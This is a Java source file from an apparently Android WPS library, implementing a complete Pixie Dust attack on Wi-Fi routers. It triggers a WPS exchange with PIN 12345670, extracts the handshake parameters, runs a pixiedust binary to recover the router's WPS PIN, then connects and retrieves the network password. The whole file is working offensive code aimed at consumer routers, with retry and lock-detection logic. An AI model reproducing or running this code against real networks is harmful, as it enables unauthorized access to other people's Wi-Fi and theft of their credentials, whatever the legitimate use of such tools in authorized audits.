package sangiorgi.wps.lib.services;

import android.util.Log;
import java.util.List;
import java.util.Locale;
import java.util.concurrent.CompletableFuture;
import java.util.concurrent.TimeUnit;
import sangiorgi.wps.lib.WpsLibConfig;
import sangiorgi.wps.lib.commands.*;
import sangiorgi.wps.lib.models.PixieDustParameters;
import sangiorgi.wps.lib.utils.WpsPixieExtractor;

/**
 * Executor for Pixie Dust attack workflow 1. Attempts WPS connection with PIN 12345670 to extract
 * parameters 2. Uses extracted parameters with pixiedust binary 3. If PIN is found, attempts WPS
 * connection with discovered PIN 4. Retries up to 5 times if parameters extraction fails
 */
public class PixieDustExecutor {
  private static final String TAG = "PixieDustExecutor";
  private static final String PIXIE_PIN = "12345670";
  private static final int MAX_RETRIES = 5;
  private static final int EXTRACTION_TIMEOUT_SECONDS = 15;

  private final WpsLibConfig libConfig;
  private final WpsExecutor sharedExecutor;
  private final CommandConfig config;

  // Internal result for parameter extraction
  private static class ExtractionResult {
    final PixieDustParameters parameters;
    final boolean wpsLocked;
    final boolean timeout;

    ExtractionResult(PixieDustParameters parameters, boolean wpsLocked, boolean timeout) {
      this.parameters = parameters;
      this.wpsLocked = wpsLocked;
      this.timeout = timeout;
    }
  }

  public PixieDustExecutor(WpsLibConfig libConfig, WpsExecutor sharedExecutor) {
    this.libConfig = libConfig;
    this.sharedExecutor = sharedExecutor;
    this.config = new CommandConfig(libConfig.getFilesDir(), false, 30);
  }

  /** Execute complete Pixie Dust attack workflow */
  public CompletableFuture<PixieDustResult> executePixieDust(String bssid) {
    return CompletableFuture.supplyAsync(
        () -> {
          Log.i(TAG, "Starting Pixie Dust attack on BSSID: " + bssid);

          // Try to extract parameters up to MAX_RETRIES times
          ExtractionResult extractionResult = null;
          int attempt = 0;

          while (attempt < MAX_RETRIES) {
            attempt++;
            Log.d(TAG, "Attempt " + attempt + " to extract Pixie Dust parameters");

            extractionResult = extractPixieParameters(bssid);

            // If WPS is locked, no point retrying
            if (extractionResult.wpsLocked) {
              Log.w(TAG, "WPS is locked on this router");
              return new PixieDustResult(
                  false, bssid, null, null, "WPS is locked on this router. Cannot perform attack.");
            }

            // If we got parameters, break out of retry loop
            if (extractionResult.parameters != null) {
              break;
            }

            Log.w(TAG, "Failed to extract parameters on attempt " + attempt);
            if (attempt < MAX_RETRIES) {
              try {
                // Wait before retrying
                Thread.sleep(2000);
              } catch (InterruptedException e) {
                Thread.currentThread().interrupt();
                Log.w(TAG, "Pixie Dust extraction interrupted");
                return new PixieDustResult(false, bssid, null, null, "Attack was interrupted");
              }
            }
          }

          // Check if we successfully extracted parameters
          if (extractionResult.parameters == null) {
            Log.e(
                TAG, "Failed to extract Pixie Dust parameters after " + MAX_RETRIES + " attempts");
            String message =
                extractionResult.timeout
                    ? "Timeout waiting for WPS response. Router may not support WPS or is not responding."
                    : "Failed to extract Pixie Dust parameters. The router may not be vulnerable to this attack.";
            return new PixieDustResult(false, bssid, null, null, message);
          }

          Log.i(TAG, "Successfully extracted Pixie Dust parameters, executing attack");

          // Execute pixiedust with extracted parameters
          PixieDustResult pixieResult =
              executePixieDustWithParameters(bssid, extractionResult.parameters);

          // If PIN was found, attempt WPS connection with it
          if (pixieResult.isSuccess() && pixieResult.getPin() != null) {
            Log.i(TAG, "PIN found: " + pixieResult.getPin() + ", attempting WPS connection");
            WpsResult wpsResult = attemptWpsConnection(bssid, pixieResult.getPin());

            // Update result with WPS connection outcome
            return new PixieDustResult(
                wpsResult != null && wpsResult.isSuccess(),
                bssid,
                pixieResult.getPin(),
                wpsResult,
                wpsResult != null && wpsResult.isSuccess()
                    ? "Successfully connected with PIN: " + pixieResult.getPin()
                    : "PIN found (" + pixieResult.getPin() + ") but WPS connection failed");
          }

          return pixieResult;
        });
  }

  /** Extract Pixie Dust parameters by attempting WPS connection */
  @SuppressWarnings("BusyWait") // Polling with sleep is intentional here
  private ExtractionResult extractPixieParameters(String bssid) {
    // Track if we found all parameters
    final boolean[] hasAllParams = {false};

    try (WpaSupplicantSession session =
        new WpaSupplicantSession(
            config,
            line -> {
              // Check if we have all the parameters we need for pixiedust
              // This is called for each line, so we need to check accumulated output
              // The session stores output, but we can't access it here easily
              // So we track it via the hasAllParams flag set below
              return hasAllParams[0];
            })) {

      session.start();
      session.waitForReady();

      Log.d(TAG, "wpa_supplicant initialized, executing wpa_cli with PIN " + PIXIE_PIN);

      // Execute wpa_cli commands
      session.executeWpaCliCommands(bssid, PIXIE_PIN);

      // Poll for parameters with timeout
      Log.d(TAG, "Waiting for Pixie Dust parameters...");
      long startTime = System.currentTimeMillis();
      long timeoutMs = EXTRACTION_TIMEOUT_SECONDS * 1000L;

      while (System.currentTimeMillis() - startTime < timeoutMs) {
        // Check if WPS is locked
        if (session.isWpsLocked()) {
          return new ExtractionResult(null, true, false);
        }

        // Check if we have all parameters
        List<String> currentOutput = session.getOutput();
        if (WpsPixieExtractor.hasPixieParameters(currentOutput)) {
          hasAllParams[0] = true;
          Log.d(TAG, "All Pixie Dust parameters found!");
          break;
        }

        Thread.sleep(500);
      }

      boolean timeout = !hasAllParams[0];
      if (timeout) {
        Log.w(TAG, "Timeout waiting for Pixie Dust parameters");
      }

      // Check if WPS is locked (final check)
      if (session.isWpsLocked()) {
        return new ExtractionResult(null, true, false);
      }

      // Extract parameters from collected output
      List<String> outputLines = session.getOutput();
      Log.d(TAG, "Collected " + outputLines.size() + " lines of output");

      if (!outputLines.isEmpty() && WpsPixieExtractor.hasPixieParameters(outputLines)) {
        PixieDustParameters params = WpsPixieExtractor.extractParameters(outputLines);
        if (params != null && params.isValid()) {
          Log.i(TAG, "Successfully extracted Pixie Dust parameters");
          return new ExtractionResult(params, false, false);
        }
      }

      Log.w(TAG, "No Pixie Dust parameters found in WPS output");
      return new ExtractionResult(null, false, timeout);

    } catch (InterruptedException e) {
      Thread.currentThread().interrupt();
      Log.e(TAG, "Parameter extraction interrupted", e);
      return new ExtractionResult(null, false, false);
    } catch (Exception e) {
      Log.e(TAG, "Error extracting Pixie parameters", e);
      return new ExtractionResult(null, false, false);
    }
  }

  /** Execute pixiedust binary with extracted parameters */
  private PixieDustResult executePixieDustWithParameters(
      String bssid, PixieDustParameters parameters) {
    // Log each parameter separately
    Log.d(TAG, "Pixie Dust parameters:");
    Log.d(TAG, "  PKE: " + parameters.getPke());
    Log.d(TAG, "  PKR: " + parameters.getPkr());
    Log.d(TAG, "  E-Hash1: " + parameters.getEhash1());
    Log.d(TAG, "  E-Hash2: " + parameters.getEhash2());
    Log.d(TAG, "  AuthKey: " + parameters.getAuthKey());
    Log.d(TAG, "  E-Nonce: " + parameters.getEnonce());

    try {
      PixieDustCommand pixieCmd = new PixieDustCommand(bssid, parameters, config);
      CommandResult result = pixieCmd.execute().get(60, TimeUnit.SECONDS);

      // Parse output to find PIN
      String pin = null;
      boolean pinNotFound = false;

      if (result.getOutput() != null) {
        for (String line : result.getOutput()) {
          if (line == null) continue;

          // Check for "not found" message
          if (line.toLowerCase(Locale.ROOT).contains("not found")
              || line.toLowerCase(Locale.ROOT).contains("pin not found")) {
            pinNotFound = true;
            Log.w(TAG, "Pixie Dust: PIN not found");
          }

          // Look for WPS PIN in output
          if (line.contains("WPS pin") || line.contains("WPS PIN")) {
            String[] parts = line.split(":");
            if (parts.length > 1) {
              pin = parts[1].trim();
              // Validate PIN format (8 digits)
              if (pin.matches("\\d{8}")) {
                Log.i(TAG, "Pixie Dust: Found PIN " + pin);
                break;
              }
            }
          }

          // Alternative PIN format
          if (pin == null && (line.contains("PIN") || line.contains("pin"))) {
            java.util.regex.Pattern pattern = java.util.regex.Pattern.compile("\\b\\d{8}\\b");
            java.util.regex.Matcher matcher = pattern.matcher(line);
            if (matcher.find()) {
              pin = matcher.group();
              Log.i(TAG, "Pixie Dust: Found PIN " + pin);
              break;
            }
          }
        }
      }

      if (pin != null) {
        Log.i(TAG, "Pixie Dust attack successful! PIN found: " + pin);
        return new PixieDustResult(true, bssid, pin, null, "PIN discovered: " + pin);
      } else if (pinNotFound) {
        Log.w(TAG, "Pixie Dust: Router not vulnerable");
        return new PixieDustResult(
            false,
            bssid,
            null,
            null,
            "PIN not found. Router is not vulnerable to Pixie Dust attack.");
      } else {
        Log.w(TAG, "Pixie Dust executed but no PIN found in output");
        return new PixieDustResult(
            false,
            bssid,
            null,
            null,
            "Attack executed but no PIN found. Router may not be vulnerable.");
      }
    } catch (Exception e) {
      Log.e(TAG, "Error executing Pixie Dust attack", e);
      return new PixieDustResult(
          false, bssid, null, null, "Error executing attack: " + e.getMessage());
    }
  }

  /** Attempt WPS connection with discovered PIN using the shared executor. */
  private WpsResult attemptWpsConnection(String bssid, String pin) {
    try {
      Log.i(TAG, "Attempting WPS connection with PIN: " + pin);

      // Use the shared executor — no need to create a new thread pool and env setup
      WpsResult result = sharedExecutor.executeWpsConnection(bssid, pin).get(30, TimeUnit.SECONDS);

      if (result != null && result.isSuccess()) {
        Log.i(TAG, "WPS connection successful with PIN: " + pin);
      } else {
        Log.w(TAG, "WPS connection failed with PIN: " + pin);
      }

      return result;

    } catch (Exception e) {
      Log.e(TAG, "Error attempting WPS connection with discovered PIN", e);
      return null;
    }
  }

  /** Result of Pixie Dust attack */
  public static class PixieDustResult {
    private final boolean success;
    private final String bssid;
    private final String pin;
    private final WpsResult wpsResult;
    private final String message;

    public PixieDustResult(
        boolean success, String bssid, String pin, WpsResult wpsResult, String message) {
      this.success = success;
      this.bssid = bssid;
      this.pin = pin;
      this.wpsResult = wpsResult;
      this.message = message;
    }

    public boolean isSuccess() {
      return success;
    }

    public String getBssid() {
      return bssid;
    }

    public String getPin() {
      return pin;
    }

    public WpsResult getWpsResult() {
      return wpsResult;
    }

    public String getMessage() {
      return message;
    }

    public String getPassword() {
      if (wpsResult != null && wpsResult.getPassword() != null) {
        return wpsResult.getPassword();
      }
      return null;
    }
  }
}
